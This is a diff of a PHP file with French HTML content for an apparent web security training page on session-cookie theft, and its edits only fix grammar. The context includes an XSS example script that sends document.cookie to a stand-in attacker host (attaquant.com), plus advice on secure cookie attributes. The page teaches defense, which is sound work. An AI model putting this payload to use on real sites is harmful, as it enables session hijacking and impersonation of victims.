@@ -217,10 +217,10 @@ $exploit = '<div>
         <div class="border">
             <p>SguoZrBeijjAH6EhAUO4LxQFjZ1bucVdFEIManrTgtAwJiwZ2j</p>
         </div>
-        <p>Dans le cas où un attaquant subtiliserait le jeton en utilisant l’une des méthodes d’exploitation évoqués
+        <p>Dans le cas où un attaquant subtiliserait le jeton en utilisant l’une des méthodes d’exploitation évoquée
         précédemment, cela pourrait mener au contournement de l’authentification. Une fois que l’attaquant a réussi à
         copier et à importer le témoin sur son navigateur, il pourra se faire passer pour la victime.</p>
-        <p>Cette récupération pourrait être réalisé par injection XSS, dont voici un exemple :</p>
+        <p>Cette récupération pourrait être réalisée par injection XSS, dont voici un exemple :</p>
         <pre class="line-numbers"><code class="language-html">&lt;script&gt;
     document.location="http://attaquant.com/vol_cookies.php?cookie=" + document.cookie;
 &lt;/script&gt;</code></pre>
@@ -267,7 +267,7 @@ $fix = '<div>
                 il y aura déconnexion.
             </li>
             <li><strong>Mettre en œuvre des attributs sécurisés</strong><br />
-                Des attributs peuvent être ajouté aux témoins dans le but d’empêcher l’exploitation par une personne
+                Des attributs peuvent être ajoutés aux témoins dans le but d’empêcher l’exploitation par une personne
                 extérieure. Parmi les plus importants, on retrouve :
                 <ul>
                     <li><strong>HttpOnly</strong><br />
